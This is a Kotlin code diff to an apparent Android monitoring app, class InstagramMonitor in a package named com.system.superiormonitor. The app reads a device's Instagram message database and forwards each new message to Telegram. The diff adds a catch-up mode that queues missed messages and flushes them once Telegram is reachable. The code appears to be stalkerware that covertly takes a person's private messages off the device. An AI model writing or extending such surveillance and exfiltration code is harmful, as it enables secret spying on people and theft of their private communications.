@@ -154,14 +154,14 @@ class InstagramMonitor(
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (TS: ${prefsManager.instagramLastProcessedId}). Watching for live messages...")
                 } else {
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from TS: ${prefsManager.instagramLastProcessedId}. Performing catch-up sync...")
-                    processNewMessages()
+                    processNewMessages(isCatchUp = true)
                 }
 
                 createWatcherFlow()
                     .debounce(DEBOUNCE_MS)
                     .collect {
                         try {
-                            processNewMessages()
+                            processNewMessages(isCatchUp = false)
                         } catch (e: CancellationException) {
                             throw e
                         } catch (e: Exception) {
@@ -254,7 +254,7 @@ class InstagramMonitor(
         }
     }
 
-    private suspend fun processNewMessages() {
+    private suspend fun processNewMessages(isCatchUp: Boolean = false) {
         Thread.sleep(150)
         syncDatabase()
 
@@ -279,19 +279,31 @@ class InstagramMonitor(
                     if (!processedIds.contains(row.id) && row.tsMicros > prefsManager.instagramLastProcessedId) {
                         processedIds.add(row.id)
                         val formatted = formatOutputMessage(row)
-                        OfflineManager.sendOrQueue(
-                            context = context,
-                            message = formatted,
-                            offlineSubdir = "instagram",
-                            offlineFileName = "offline_instagram.txt",
-                            sender = sendTelegram
-                        )
+                        if (isCatchUp) {
+                            OfflineManager.queueOnly(
+                                context = context,
+                                message = formatted,
+                                offlineSubdir = "instagram",
+                                offlineFileName = "offline_instagram.txt"
+                            )
+                        } else {
+                            OfflineManager.sendOrQueue(
+                                context = context,
+                                message = formatted,
+                                offlineSubdir = "instagram",
+                                offlineFileName = "offline_instagram.txt",
+                                sender = sendTelegram
+                            )
+                        }
                         prefsManager.instagramLastProcessedId = row.tsMicros
                     }
                 }
 
                 if (processedIds.isNotEmpty()) {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded ${processedIds.size} new message(s).")
+                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded/Queued ${processedIds.size} new message(s).")
+                    if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
+                        OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
+                    }
                 }
             }
         } catch (e: Exception) {
